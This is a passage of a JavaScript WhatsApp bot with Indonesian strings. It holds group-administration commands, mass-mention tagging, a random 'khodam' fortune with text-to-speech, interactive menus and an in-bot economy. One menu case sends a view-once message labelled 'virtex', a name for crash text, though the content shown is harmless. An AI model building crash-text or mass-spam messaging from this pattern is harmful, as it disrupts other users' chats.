        const numbersOnly = text ? text.replace(/\D/g, '') + '@s.whatsapp.net' : m.quoted?.sender;
        await sych.groupParticipantsUpdate(m.chat, [numbersOnly], 'demote').catch((err) => sycreply('Gagal!'));
    }
}
break;
			case 'setname':
case 'setnamegc':
case 'setsubject':
case 'setsubjectgc': {
     
    if (!m.isGroup) return sycreply(mess.group);
    if (!m.isAdmin) return sycreply(mess.admin);
    if (!m.isBotAdmin) return sycreply(mess.botAdmin);
    if (!text && !m.quoted) {
        sycreply(`*< / >* Example: ${prefix + command} textnya`);
    } else {
        const teksnya = text ? text : m.quoted.text;
        await sych.groupUpdateSubject(m.chat, teksnya).catch((err) => sycreply('Gagal!'));
    }
}
break;

case 'setdesc':
case 'setdescgc':
case 'setdesk':
case 'setdeskgc': {
     
    if (!m.isGroup) return sycreply(mess.group);
    if (!m.isAdmin) return sycreply(mess.admin);
    if (!m.isBotAdmin) return sycreply(mess.botAdmin);
    if (!text && !m.quoted) {
        sycreply(`*< / >* Example: ${prefix + command} textnya`);
    } else {
        const teksnya = text ? text : m.quoted.text;
        await sych.groupUpdateDescription(m.chat, teksnya).catch((err) => sycreply('Gagal!'));
    }
}
break;

case 'setppgroups':
case 'setppgrup':
case 'setppgc': {
     
    if (!m.isGroup) return sycreply(mess.group);
    if (!m.isAdmin) return sycreply(mess.admin);
    if (!m.isBotAdmin) return sycreply(mess.botAdmin);
    if (!m.quoted) return sycreply('Reply Gambar yang mau dipasang di Profile Bot');
    if (!/image/.test(mime) && /webp/.test(mime)) return sycreply(`Reply Image Dengan Caption ${prefix + command}`);
    let media = await sych.downloadAndSaveMediaMessage(quoted, 'ppgc.jpeg');
    if (text.length > 0) {
        let {
            img
        } = await generateProfilePicture(media);
        await sych.query({
            tag: 'iq',
            attrs: {
                to: m.chat,
                type: 'set',
                xmlns: 'w:profile:picture'
            },
            content: [{
                tag: 'picture',
                attrs: {
                    type: 'image'
                },
                content: img
            }]
        });
        await fs.unlinkSync(media);
        sycreply('Sukses');
    } else {
        await sych.updateProfilePicture(m.chat, {
            url: media
        });
        await fs.unlinkSync(media);
        sycreply('Sukses');
    }
}
break;
			case 'delete':
case 'del':
case 'd': {
     
    if (!m.quoted) return sycreply('Reply pesan yang mau di delete');
    await sych.sendMessage(m.chat, {
        delete: {
            remoteJid: m.chat,
            fromMe: m.isBotAdmin ? false : true,
            id: m.quoted.id,
            participant: m.quoted.sender
        }
    });
}
break;

case 'linkgroup':
case 'linkgrup':
case 'linkgc':
case 'urlgroup':
case 'urlgrup':
case 'urlgc': {
     
    if (!m.isGroup) return sycreply(mess.group);
    if (!m.isAdmin) return sycreply(mess.admin);
    if (!m.isBotAdmin) return sycreply(mess.botAdmin);
    let response = await sych.groupInviteCode(m.chat);
    await sych.sendMessage(m.chat, {
        text: `https://chat.whatsapp.com/${response}\n\nLink Group : ${(await sych.groupMetadata(m.chat)).subject}`,
        detectLink: true
    }, {
        quoted: m
    });
}
break;



case 'revoke':
case 'newlink':
case 'newurl': {
     
    if (!m.isGroup) return sycreply(mess.group);
    if (!m.isAdmin) return sycreply(mess.admin);
    if (!m.isBotAdmin) return sycreply(mess.botAdmin);
    await sych.groupRevokeInvite(m.chat).then((a) => {
        sycreply(`Sukses Menyetel Ulang, Tautan Undangan Grup ${m.metadata.subject}`);
    }).catch((err) => sycreply('Gagal!'));
}
break;


case 'gc':
case 'grup': {
     
    if (!m.isGroup) return sycreply(mess.group);
    if (!m.isAdmin) return sycreply(mess.admin);
    if (!m.isBotAdmin) return sycreply(mess.botAdmin);
    let teks = text.split(' ');
    let set = db.groups[m.chat];
    switch (teks[0]) {
        case 'close':
        case 'open':
            await sych.groupSettingUpdate(m.chat, teks[0] == 'close' ? 'announcement' : 'not_announcement').then(a => sycreply(`*Sukses ${teks[0] == 'open' ? 'Membuka' : 'Menutup'} Group*`));
            break
    
					case 'antilink':
					case 'antivirtex':
					case 'antidelete':
					case 'welcome':
				    case 'mute':
					case 'antitoxic':
					case 'waktusholat':
					case 'nsfw':
					     
						if (teks[1] == 'on' || teks[1] == 'true') {
							if (set[teks[0]]) return sycreply('*Sudah Aktif Sebelumnya*')
							set[teks[0]] = true
							sycreply('*Sukses Change To On*')
						} else if (teks[1] == 'off' || teks[1] == 'false') {
							set[teks[0]] = false
							sycreply('*Sukses Change To Off*')
						} else {
							sycreply(`❗${teks[0].charAt(0).toUpperCase() + teks[0].slice(1)} on/off`)
						}
						break
					default:
						sycreply(`${m.metadata.subject}\n- Mute : ${set.mute ? '✅' : '❌'}\n- Anti Link : ${set.antilink ? '✅' : '❌'}\n- Anti Virtex : ${set.antivirtex ? '✅' : '❌'}\n- Anti Delete : ${set.antidelete ? '✅' : '❌'}\n- Welcome : ${set.welcome ? '✅' : '❌'}\n\n*< / >* Example:\n${prefix + command} antilink off`)
				}
			}
			break
			case 'tagall': {
			     
				if (!m.isGroup) return sycreply(mess.group)
				if (!m.isAdmin) return sycreply(mess.admin)
				if (!m.isBotAdmin) return sycreply(mess.botAdmin)
				let setv = pickRandom(listv)
				let teks = `*Tag All*\n\n*Pesan :* ${q ? q : ''}\n\n`
				for (let mem of m.metadata.participants) {
					teks += `${setv} @${mem.id.split('@')[0]}\n`
				}
				await sych.sendMessage(m.chat, {
					text: teks,
					mentions: m.metadata.participants.map(a => a.id)
				}, {
					quoted: m
				})
			}
			break
			case 'hidetag':
			case 'h': {
			     
				if (!m.isGroup) return sycreply(mess.group)
				if (!m.isAdmin) return sycreply(mess.admin)
				if (!m.isBotAdmin) return sycreply(mess.botAdmin)
				sych.sendMessage(m.chat, {
					text: q ? q : '',
					mentions: m.metadata.participants.map(a => a.id)
				}, {
					quoted: m
				})
			}
			break
			case 'totag': {
			     
				if (!m.isGroup) return sycreply(mess.group)
				if (!m.isAdmin) return sycreply(mess.admin)
				if (!m.isBotAdmin) return sycreply(mess.botAdmin)
				if (!m.quoted) return sycreply(`Reply pesan dengan caption ${prefix + command}`)
				delete m.quoted.chat
				await sych.sendMessage(m.chat, {
					forward: m.quoted.fakeObj,
					mentions: m.metadata.participants.map(a => a.id)
				})
			}
			break
			case 'listonline':
			case 'liston': {
			     
				if (!m.isGroup) return sycreply(mess.group)
				let id = args && /\d+\-\d+@g.us/.test(args[0]) ? args[0] : m.chat
				if (!store.presences || !store.presences[id]) return sycreply('Sedang Tidak ada yang online!')
				let online = [...Object.keys(store.presences[id]), botNumber]
				await sych.sendMessage(m.chat, {
					text: 'List Online:\n\n' + online.map(v => setv + ' @' + v.replace(/@.+/, '')).join`\n`,
					mentions: online
				}, {
					quoted: m
				}).catch((e) => sycreply('Gagal'))
			}
			break
			//cekkhodam
			case 'cekkodam2':{
    const defaultLang = 'id';
    const gtts = require( 'node-gtts')
    // Penanganan input nama
    let lana;
    if (args.length === 0 || !args[0]) {
        return sycreply('Harap masukkan nama kamu.');
    } else {
        lana = args[0];
    }

    let lang = args[1];
    if (!lang || lang.length !== 2) {
        lang = defaultLang;
    }
    
    const khodam = [
  "Singa",
  "kosoong atau tidak ada",
  "Harimau",
  "Elang",
  "Serigala",
  "Naga",
  "Gajah",
  "Kuda",
  "Macan Tutul",
  "Kerbau",
  "Burung Hantu",
  "Burung Rajawali",
  "Ikan Hiu",
  "Lumba-Lumba",
  "Ular",
  "Kura-Kura",
  "Tupai",
  "Paus",
  "Kelelawar",
  "Kijang",
  "Banteng",
  "Rusa",
  "Anjing",
  "Kucing",
  "Buaya",
  "Kambing",
  "Kuda Nil",
  "Bebek",
  "Angsa",
  "Ayam",
  "Merpati",
  "Burung Beo",
  "Burung Kenari",
  "Burung Kakatua",
  "Bunglon",
  "Cicak",
  "Kodok",
  "Katak",
  "Tikus",
  "Landak",
  "Kanguru",
  "Koala",
  "Panda",
  "Beruang",
  "Rubah",
  "Lynx",
  "Leopard",
  "Jaguar",
  "Cheetah",
  "Badak",
  "Zebra",
  "Antelop",
  "Unta",
  "Alpaka",
  "Llama",
  "Serigala Abu-abu",
  "Serigala Merah",
  "Serigala Putih",
  "Lynx",
  "Harimau Putih",
  "Harimau Siberia",
  "Harimau Sumatra",
  "Gorila",
  "Orangutan",
  "Simpanse",
  "Monyet",
  "Babun",
  "Lemur",
  "Iguana",
  "Komodo",
  "Salamander",
  "Belut",
  "Sotong",
  "Gurita",
  "Kepiting",
  "Lobster",
  "Udang",
  "Kupu-kupu",
  "Lebah",
  "Tawon",
  "Kumbang",
  "Belalang",
  "Jangkrik",
  "Semut",
  "Kecoak",
  "Laba-laba",
  "Kalajengking",
  "Serangga Tongkat",
  "Naga Laut",
  "Kuda Laut",
  "Duyung",
  "Putri Duyung",
  "Burung Kolibri",
  "Burung Hantu Salju",
  "Burung Puyuh",
  "Burung Gagak",
  "Burung Pelikan",
  "Burung Albatros",
  "Burung Flamingo",
  "Burung Hering",
  "Burung Camar",
  "Burung Pinguin",
    "Cincin",
    "Batu Akik",
    "Keris",
    "Tongkat",
    "Pusaka",
    "Patung",
    "Mustika",
    "Tasbih",
    "Kalung",
    "Gelang",
    "Permata",
    "Pedang",
    "Mata Uang",
    "Wesi Kuning",
    "Serat Tali",
    "Belati",
    "Cundrik",
    "Selendang",
    "Jarum",
    "Tombak",
    "Kerikil",
    "Kendi",
    "Kain Kafan",
    "Topi",
    "Payung",
    "Sandal",
    "Kacamata",
    "Sabuk",
    "Sarung",
    "Tali Ikat Pinggang",
    "Surat",
    "Kunci",
    "Lilin",
    "Peniti",
    "Sisir",
    "Cermin",
    "Kendi Air",
    "Piring",
    "Gelas",
    "Mangkuk",
    "Sendok",
    "Sapu",
    "Gayung",
    "Tikar",
    "Bantal",
    "Guci",
    "Lentera",
    "Lampu",
    "Buku",
    "Pena",
    "Dupa",
    "Asbak",
    "Cangkir",
    "Gantungan Kunci",
    "Kalender",
    "Sepeda",
    "Lukisan",
    "Batu Kerikil",
    "Batu Kali",
    "Kipas",
    "Peci",
    "Sorban",
    "Rokok",
    "Topeng",
    "Gamelan",
    "Angklung",
    "Suling",
    "Wayang",
    "Kuda-Kudaan",
    "Sepatu",
    "Jam Tangan",
    "Kosong atau tidak adaa"
];


    const randomKhodam = khodam[Math.floor(Math.random() * khodam.length)];
    let text = `Khodam ${lana} adalah ${randomKhodam}`;
function tts(text, lang = 'id') {
return new Promise((resolve, reject) => {
try {
let tts = gtts(lang)
let filePath =  (1 * new Date) + '.mp3'
tts.save(filePath, text, () => {
resolve(fs.readFileSync(filePath))
fs.unlinkSync(filePath)
})
} catch (e) { reject(e) }
})
}    
    


    let res;
    try {
        res = await tts(text, lang);
    } catch (e) {
        sycreply(e + '');
        res = await tts(text, defaultLang);
    } finally {
        sycreply(text)
        if (res) {
await sych.sendMessage(m.chat, { audio: res, ptt: true, mimetype: "audio/mpeg", fileName: "vn.mp3", waveform: [100, 0, 100, 0, 100, 0, 100] }, { quoted: fkontak });
        }
    }
};
break


			// Bot Menu
			
			//RECODEEEEE BY GALANG
			
	

case 'm1': {


    try {
        console.log(chalk.blue.bold('Mengirim lokasi...'));

        // URL gambar yang akan digunakan sebagai thumbnail
        const imageUrl = "https://raw.githubusercontent.com/Galangxyz/Store/gh-pages/rka.jpg";

        // Mengambil buffer gambar dari URL
        const imageBuffer = await getBuffer(imageUrl); 
        console.log("imageBuffer (before Uint8Array conversion):", imageBuffer);

        // Konversi ke Uint8Array agar sesuai dengan jpegThumbnail
        const jpegThumbnail = new Uint8Array(imageBuffer);

        // Simpan ke file JSON untuk analisis
        fs.writeFileSync('imageBuffer.json', JSON.stringify([...jpegThumbnail], null, 2));
        console.log("Array jpegThumbnail berhasil disimpan ke imageBuffer.json");

        // Debugging array lengkap
        console.dir(jpegThumbnail, { maxArrayLength: null });

        // Membuat pesan dengan jpegThumbnail yang benar
        let locationMsg = generateWAMessageFromContent(m.chat, {
            viewOnceMessage: {
                message: {
                    "newsletterAdminInviteMessage": {
                        "newsletterJid": `120363396726721623@newsletter`,
                        "newsletterName": "virtex",
                        "jpegThumbnail": jpegThumbnail, // Menggunakan Uint8Array yang valid
                        "caption": "> virtex",
                        serverMessageId: 143,
                        "inviteExpiration": Date.now() + 1814400000 // 3 hari dari sekarang
                    }
                }
            }
        }, { userJid: m.chat, quoted: fkontak });

        console.log("locationMsg:", locationMsg);

    let buttons = [
        {
            buttonId: `${prefix}pubg`,
            buttonText: { displayText: "Pubg" },
            type: 1
        },
        {
            buttonId: `${prefix}ff`,
            buttonText: { displayText: "Free Fire" },
            type: 1
        },
        {
            buttonId: `${prefix}ml`,
            buttonText: { displayText: "Mobile Legend" },
            type: 1
        }
    ];

    let buttonMessage = {
        text: "Silahkan pilih *option* di bawah ini",
        footer: "©Langz",
        buttons: buttons,
        headerType: 1,
        contextInfo: {
            mentionedJid: [m.sender],
            forwardingScore: 999,
            isForwarded: true,
            forwardedNewsletterMessageInfo: {
                newsletterName: "Powered By 𝘓𝘢𝘯𝘨𝘻 𝘐𝘯 𝘏𝘦𝘳𝘦",
                newsletterJid: "120363373320014871@newsletter",
                serverMessageId: 143
            }
        }
    };

    await sych.relayMessage(m.chat, locationMsg.message, { messageId: locationMsg.key.id });
    await sych.sendMessage(m.chat, buttonMessage, { quoted: fkontak });

        // Tunggu beberapa detik sebelum mengirim pesan kedua (agar tidak spam)
        await new Promise(resolve => setTimeout(resolve, 1000));

        console.log(chalk.green.bold('Mengirim pesan menu...'));

        let sections = [{
            title: 'Select Menu',
            highlight_label: 'Recommended',
            rows: [
                { title: `${prefix}Allmenu`, description: `Daftar semua menu yang tersedia.`, id: `${prefix}allmenu` },
                { title: `${prefix}Downloadmenu`, description: `Menu untuk mendownload media.`, id: `${prefix}downloadmenu` },
                { title: `${prefix}Ownermenu`, description: `Menu khusus untuk owner.`, id: `${prefix}ownermenu` },
                { title: `${prefix}Groupmenu`, description: `Menu untuk pengelolaan grup.`, id: `${prefix}groupmenu` },
                { title: `${prefix}Funmenu`, description: `Menu hiburan dengan berbagai fitur.`, id: `${prefix}funmenu` },
                { title: `${prefix}Gamemenu`, description: `Menu untuk bermain game.`, id: `${prefix}gamemenu` },
                { title: `${prefix}Aimenu`, description: `Menu AI dan fitur kecerdasan buatan.`, id: `${prefix}aimenu` },
                { title: `${prefix}Toolsmenu`, description: `Menu berisi berbagai tools.`, id: `${prefix}toolsmenu` }
            ]
        }];

        let listMessage = {
            title: 'Select Menu',
            sections
        };

        let msg = generateWAMessageFromContent(m.chat, {
            viewOnceMessage: {
                message: {
                    "messageContextInfo": {
                        "deviceListMetadata": {},
                        "deviceListMetadataVersion": 2
                    },
                    interactiveMessage: proto.Message.InteractiveMessage.create({
                        contextInfo: {
                            mentionedJid: [m.sender],
                            isForwarded: true,
                            forwardedNewsletterMessageInfo: {
                                newsletterJid: '120363373320014871@newsletter',
                                newsletterName: 'Powered By Galangxyz',
                                serverMessageId: -1
                            },
                            businessMessageForwardInfo: { businessOwnerJid: sych.decodeJid(sych.user.id) }
                        },
                        body: proto.Message.InteractiveMessage.Body.create({
                            text: `🔰 Silakan pilih menu berikut:`
                        }),
                        footer: proto.Message.InteractiveMessage.Footer.create({
                            text: `⚡ Powered by Langz Bot`
                        }),
                        header: proto.Message.InteractiveMessage.Header.create({
                            locationMessage: {
                                degreesLatitude: 40.712776,
                                degreesLongitude: -74.005974,
                                name: "New York City, USA",
                                address: "Times Square, New York, USA"
                            },
                            title: `> Follow my GitHub: https://github.com/Galangxyz`,
                            subtitle: "",
                            hasMediaAttachment: true, ...(await prepareWAMessageMedia({ image: { url: "https://Galangxyz.github.io/bkp/3f25bf7ebbfb84ecbc3bdb2d1da8bdf2.jpg" } }, { upload: sych.waUploadToServer }))
                        }),
                        nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                            buttons: [
                                { name: "single_select", buttonParamsJson: JSON.stringify(listMessage) },
                                { name: "cta_url", buttonParamsJson: JSON.stringify({ display_text: "Profile Side", url: "https://profile.galng.my.id/", merchant_url: "https://www.google.com" }) },
                                { name: "cta_call", buttonParamsJson: JSON.stringify({ display_text: "Phone Number", phone_number: "+6283833735020" }) },
                                { name: "quick_reply", buttonParamsJson: JSON.stringify({ display_text: "Ping Bot", id: `${prefix}ping` }) },
                                { name: "quick_reply", buttonParamsJson: JSON.stringify({ display_text: "Contact Owner", id: `${prefix}pepek` }) }
                            ]
                        })
                    })
                }
            }
        }, { quoted: fkontak });

        await sych.relayMessage(m.chat, msg.message, { messageId: msg.key.id });

        console.log(chalk.green.bold('Pesan case "m1" berhasil dikirim.'));
    } catch (err) {
        console.error(chalk.red.bold('Error di case "m1":'), err);
    }
}
break;





		case 'menuk': {
  try {
    // Pengecekan isRegistered
    if (!isRegistered) {
      return sycreply('Kamu belum terdaftar! Silakan daftar terlebih dahulu dengan perintah "daftar".');
    }

    // Struktur list untuk menu pilihan
    let sections = [
      {
        title: 'Select Menu',
        highlight_label: 'Powered by Galangxyz',
        rows: [
          {
            title: 'Ping Bot',
            description: 'Ping Bot 🟢',
            id: 'ping'
          },
          {
            title: 'Runtime',
            description: 'Menampilkan info Runtime 🤖',
            id: 'call'
          }
        ]
      }
    ];

    let listMessage = {
      title: 'Select Menu',
      sections
    };

    // Header tambahan setelah single select
    // Tambahkan sections untuk CIMB Niaga
let sectionsCIMB = [
  {
    title: "Select Menu",
    highlight_label: 'Powered by Galangxyz',
    rows: [
      {
        title: "Motivasi",
        description: "Kumpulan Motivasi ⚔️",
        id: "motivasi"
      },
      {
        title: "Quotes",
        description: "Kumpulan Quotes ⚖️",
        id: "quotes"
      },
            {
        title: "Dare",
        description: "Dare (TOD) 💀",
        id: "motivasi"
      },
            {
        title: "Truth",
        description: "Truth (TOD) 💀",
        id: "motivasi"
      },
            {
        title: "Renungan",
        description: "Renungan 🗣️",
        id: "motivasi"
      }
    ]
  }
];
let listMessageCIMB = {
      title: 'Select Menu',
      sections: sectionsCIMB
    };
// Tambahkan sections untuk Bank Rakyat Indonesia
let sectionsBRI = [
  {
    title: "Select Menu",
    highlight_label: 'Powered by Galangxyz',
    rows: [
      {
        title: "Claim",
        description: "Claim Daily ✅",
        id: "claim"
      },
            {
        title: "Tagme",
        description: "Tag Diri sendiri 📎",
        id: "claim"
      },
      {
        title: "Tagall",
        description: "Tag Semua Orang 🔗",
        id: "tagall"
      }
    ]
  }
];
let listMessageBRI = {
      title: 'Select Menu',
      sections: sectionsBRI
    };
const name = getUserName(m.sender);
const additionalHeaders = [
  {
    header: {
      title: "> Kita adalah suatu kemungkinan yaang tidak mungkin.",
      hasMediaAttachment: true,
      imageMessage: (await generateWAMessageContent({
        image: {
          url: 'https://Galangxyz.github.io/bkp/f069d74b8025faaba10d9320bb05c175.jpg'
        }
      }, {
        upload: sych.waUploadToServer
      })).imageMessage
    },
    body: {
      text: `> 【对象或字符串】`
    },
    footer: {
      text: "\n\n请求加密Motivasi\n请求加密Quotes\n请求加密Dare\n请求加密Truth\n请求加密Renungan"
    },
    nativeFlowMessage: {
      buttons: [
                    {
                            name: "single_select",
                            buttonParamsJson: JSON.stringify(listMessageCIMB)
                        },
                        {
                            name: "quick_reply", // Tombol Quick Reply
                            buttonParamsJson: JSON.stringify({
                                display_text: "Ping Bot",
                                id: `${prefix}ping`
                            })
                        },
                        {
                            name: "cta_url",
                            buttonParamsJson: JSON.stringify({
                                display_text: "✈Github",
                                url: "https://github.com/Galangxyz",
                                merchant_url: "https://www.google.com"
                            })
                        }
      ]
    }
  },
  {
    header: {
      title: "> Kagumi saja dia dari jauh, daripada dia tau lalu menjauh",
      hasMediaAttachment: true,
      imageMessage: (await generateWAMessageContent({
        image: {
          url: 'https://Galangxyz.github.io/bkp/5acef6a3a51cfcf3534b7f544a8921d0.jpg'
        }
      }, {
        upload: sych.waUploadToServer
      })).imageMessage
    },
    body: {
      text: `> 【对象或字符串】`
    },
    footer: {
      text: "\n\n\n\n\n请求加密Claim\n请求加密Tag All\n请求加密Tag Me"
    },
    nativeFlowMessage: {
      buttons: [
                    {
                            name: "single_select",
                            buttonParamsJson: JSON.stringify(listMessageBRI)
                        },
                        {
                            name: "quick_reply", // Tombol Quick Reply
                            buttonParamsJson: JSON.stringify({
                                display_text: "Ping Bot",
                                id: `${prefix}ping`
                            })
                        },
                        {
                            name: "cta_url",
                            buttonParamsJson: JSON.stringify({
                                display_text: "✈Github",
                                url: "https://github.com/Galangxyz",
                                merchant_url: "https://www.google.com"
                            })
                        }
      ]
    }
  }
];

    // Gabungkan semua header
    const carouselCards = [
      {
        header: {
          title: `> Hi ${name} ${ucapanWaktu}`,
          hasMediaAttachment: true,
          imageMessage: (await generateWAMessageContent({
            image: {
              url: './src/media/sychy.png'
            }
          }, {
            upload: sych.waUploadToServer
          })).imageMessage
        },
        body: {
          text: `> 【对象或字符串】 `
        },
        footer: {
          text: "\n\n\n请求加密Ping Bot\n请求加密Runtime\n\n\n"
        },
        nativeFlowMessage: {
          buttons: [
            {
                            name: "single_select",
                            buttonParamsJson: JSON.stringify(listMessage)
                        },
                        {
                            name: "quick_reply", // Tombol Quick Reply
                            buttonParamsJson: JSON.stringify({
                                display_text: "Ping Bot",
                                id: `${prefix}ping`
                            })
                        },
                        {
                            name: "cta_url",
                            buttonParamsJson: JSON.stringify({
                                display_text: "✈Github",
                                url: "https://github.com/Galangxyz",
                                merchant_url: "https://www.google.com"
                            })
                        }
          ]
        }
      },
      ...additionalHeaders // Tambahkan header tambahan
    ];

    // Generate pesan carousel
    const carouselMessage = generateWAMessageFromContent(m.chat, {
      viewOnceMessage: {
        message: {
          messageContextInfo: {
            deviceListMetadata: {},
            deviceListMetadataVersion: 2
          },
          interactiveMessage: proto.Message.InteractiveMessage.create({
            body: {
              text: ""
            },
            footer: {
              text: ""
            },
            header: {
              hasMediaAttachment: false
            },
            carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.create({
              cards: carouselCards
            })
          })
        }
      }
    }, { quoted: fkontak });

    // Kirim pesan carousel
    await sych.relayMessage(m.chat, carouselMessage.message, {
      messageId: carouselMessage.key.id
    });

  } catch (error) {
    console.error("Kesalahan saat mengirim carousel:", error);
    await sych.sendMessage(m.chat, {
      text: "Terjadi kesalahan saat mengirim pesan carousel. Silakan hubungi AI untuk memeriksa log kesalahan."
    }, {
      quoted: m
    });
  }
}
break;

//saluran
	case 'openbo': {
let sections = [{
    title: 'Select Menu',
    highlight_label: 'Recomended',
    rows: [
        {
            title: `${prefix}allmenu`,
            description: `Daftar semua menu yang tersedia.`,
            id: `${prefix}allmenu`
        },
        {
            title: `${prefix}downloadmenu`,
            description: `Menu untuk mendownload media.`,
            id: `${prefix}downloadmenu`
        },
        {
            title: `${prefix}ownermenu`,
            description: `Menu khusus untuk owner.`,
            id: `${prefix}ownermenu`
        },
        {
            title: `${prefix}groupmenu`,
            description: `Menu untuk pengelolaan grup.`,
            id: `${prefix}groupmenu`
        },
        {
            title: `${prefix}funmenu`,
            description: `Menu hiburan dengan berbagai fitur.`,
            id: `${prefix}funmenu`
        },
        {
            title: `${prefix}gamemenu`,
            description: `Menu untuk bermain game.`,
            id: `${prefix}gamemenu`
        },
        {
            title: `${prefix}aimenu`,
            description: `Menu AI dan fitur kecerdasan buatan.`,
            id: `${prefix}aimenu`
        },
        {
            title: `${prefix}toolsmenu`,
            description: `Menu berisi berbagai tools.`,
            id: `${prefix}toolsmenu`
        }
    ]
}];

let listMessage = {
    title: 'Select Menu',
    sections
};

let msg = generateWAMessageFromContent(m.chat, {
    viewOnceMessage: {
        message: {
            "messageContextInfo": {
                "deviceListMetadata": {},
                "deviceListMetadataVersion": 2
            },
            interactiveMessage: proto.Message.InteractiveMessage.create({
                contextInfo: {
                    mentionedJid: [m.sender],
                    isForwarded: true,
                    forwardedNewsletterMessageInfo: {
                        newsletterJid: '120363373320014871@newsletter',
                        newsletterName: 'Powered By Galangxyz',
                        serverMessageId: -1
                    },
                    businessMessageForwardInfo: { businessOwnerJid: sych.decodeJid(sych.user.id) },
                },
                body: proto.Message.InteractiveMessage.Body.create({
                    text: `> ${n}加密后内容，不加密时返回传入内容Gala加密内容的lang,xyz加密后的内容true 加密 false 不加密${n}`
                }),
                footer: proto.Message.InteractiveMessage.Footer.create({
                    text: `> Termux Never Die\n\nGa ada yg ga bisa kalo ga nyoba!!`
                }),
                header: proto.Message.InteractiveMessage.Header.create({
                
                    title: `> Follow my github : ${n}https://github.com/Galangxyz${n}`,
                    subtitle: "",
                    hasMediaAttachment: true, ...(await prepareWAMessageMedia({ image: { url: "https://Galangxyz.github.io/bkp/3f25bf7ebbfb84ecbc3bdb2d1da8bdf2.jpg" } }, { upload: sych.waUploadToServer }))
                }),
                nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                    buttons: [
                        {
                            name: "single_select",
                            buttonParamsJson: JSON.stringify(listMessage)
                        },
                        {
                            name: "cta_url",
                            buttonParamsJson: JSON.stringify({
                                display_text: "Github",
                                url: "https://github.com/Galangxyz",
                                merchant_url: "https://www.google.com"
                            })
                        },
                        {
                            name: "cta_call",
                            buttonParamsJson: JSON.stringify({
                                display_text: "Phone Number",
                                phone_number: "+6283833735020"
                            })
                        },
                        {
                            name: "cta_reminder",
                            buttonParamsJson: JSON.stringify({
                                display_text: "Set Reminder",
                                reminder_time: "2025-01-20T15:00:00Z", // Format ISO8601
                                reminder_title: "Meeting with Team"
                            })
                        },
                        {
                            name: "quick_reply", // Tombol Quick Reply
                            buttonParamsJson: JSON.stringify({
                                display_text: "Ping Bot",
                                id: `${prefix}ping`
                            })
                        },
                        {
                            name: "quick_reply", // Tambahan Quick Reply Lain
                            buttonParamsJson: JSON.stringify({
                                display_text: "Help Center",
                                id: `${prefix}help`
                            })
                        }
                    ]
                })
            })
        }
    }
}, { quoted: fkontak });

await sych.relayMessage(msg.key.remoteJid, msg.message, {
    messageId: msg.key.id
});
}
break;




			case 'profile':
			case 'cek': {
			     
				const user = Object.keys(db.users)
				const infoUser = db.users[m.sender]
				await sycreply(`*👤Profile @${m.sender.split('@')[0]}* :\n🐋User Bot : ${user.includes(m.sender) ? 'True' : 'False'}\n🔥User : ${isVip ? 'VIP' : isPremium ? 'PREMIUM' : 'FREE'}\n🎫Limit : ${infoUser.limit}\n💰Uang : ${infoUser ? infoUser.uang.toLocaleString('id-ID') : '0'}`)
			}
			break
			case 'leaderboard': {
			if (!isRegistered) {
      return sycreply('Kamu belum terdaftar! Silakan daftar terlebih dahulu dengan perintah "daftar".');
    }
				const entries = Object.entries(db.users).sort((a, b) => b[1].uang - a[1].uang).slice(0, 10).map(entry => entry[0]);
				let teksnya = '╭──❍「 *LEADERBOARD* 」❍\n'
				for (let i = 0; i < entries.length; i++) {
					teksnya += `│• ${i + 1}. @${entries[i].split('@')[0]}\n│• Balance : ${db.users[entries[i]].uang.toLocaleString('id-ID')}\n│\n`
				}
				sycreply(teksnya + '╰──────❍');
			}
			break
			case 'req':
			case 'request': {
			if (!isRegistered) {
      return sycreply('Kamu belum terdaftar! Silakan daftar terlebih dahulu dengan perintah "daftar".');
    }
				if (!text) return sycreply('Mau Request apa ke Owner?')
				await sych.sendMessage(m.chat, {
					text: `*Request Telah Terkirim Ke Owner*\n_Terima Kasih🙏_`
				}, {
					quoted: m
				})
				await sych.sendFromOwner(owner, `Pesan Dari : @${m.sender.split('@')[0]}\nUntuk Owner\n\nRequest ${text}`, m, {
					contextInfo: {
						mentionedJid: [m.sender],
						isForwarded: true
					}
				})
			}
			break
			case 'totalfitur': {
			     
				const total = ((fs.readFileSync('./naze.js').toString()).match(/case '/g) || []).length
				sycreply(`Total Fitur : ${total}`);
			}
			break
			case 'daily':
			case 'claim': {
				daily(m, db)
				await sych.sendMessage(m.chat, {
					react: {
						text: '🎉', // Emoji yang diinginkan
						key: m.key // Memberikan reaksi pada pesan perintah
					}
				});
			}
			break
			case 'transfer':
			case 'tf': {
			     
				transfer(m, args, db)
			}
			break
			case 'buy': {
			     
				buy(m, args, db)
			}
			break
			case 'react': {
			     
				sych.sendMessage(m.chat, {
					react: {
						text: args[0],
						key: m.quoted ? m.quoted.key : m.key
					}
				})
			}
			break
			case 'tagme': {
			     
				sych.sendMessage(m.chat, {
					text: `@${m.sender.split('@')[0]}`,
					mentions: [m.sender]
				}, {
					quoted: m
				})
			}
			break
			case 'runtime':
			case 'ngetes':
			case 'bot': {
			     
				let teks = text.split(' ')
				let set = db.set[botNumber]
				switch (teks[0]) {
					case 'mode':
					     
						if (!teks[1]) {
							return sycreply('Gunakan perintah: mode self/public');
						}
						if (teks[1].toLowerCase() === 'public') {
							if (sych.public) {
								return sycreply('*Mode public sudah aktif sebelumnya.*');
							}
							sych.public = true;
							console.log("Mode diubah ke public");
							return sycreply('*Sukses mengubah mode ke Public Usage.*');
						} else if (teks[1].toLowerCase() === 'self') {
							if (!sych.public) {
								return sycreply('*Mode self sudah aktif sebelumnya.*');
							}
							sych.public = false;
							console.log("Mode diubah ke self");
							return sycreply('*Sukses mengubah mode ke Self Usage.*');
						} else {
							return sycreply('Gunakan perintah: mode self/public');
						}
						break;
					case 'anticall':
					case 'autobio':
					case 'autoread':
					case 'autotyping':
					case 'autovn':
					case 'readsw':
					     
						if (teks[1] == 'on') {
							if (set[teks[0]]) return sycreply('*Sudah Aktif Sebelumnya*')
							set[teks[0]] = true
							sycreply('*Sukse Change To On*')
						} else if (teks[1] == 'off') {
							set[teks[0]] = false
							sycreply('*Sukse Change To Off*')
						} else {
							sycreply(`${teks[0].charAt(0).toUpperCase() + teks[0].slice(1)} on/off`)
						}
						break
					case 'set':
					case 'settings':
					     
						let settingsBot = Object.entries(set).map(([key, value]) => {
							let list = key == 'status' ? new Date(value).toLocaleString('id-ID', {
								hour: '2-digit',
								minute: '2-digit',
								second: '2-digit'
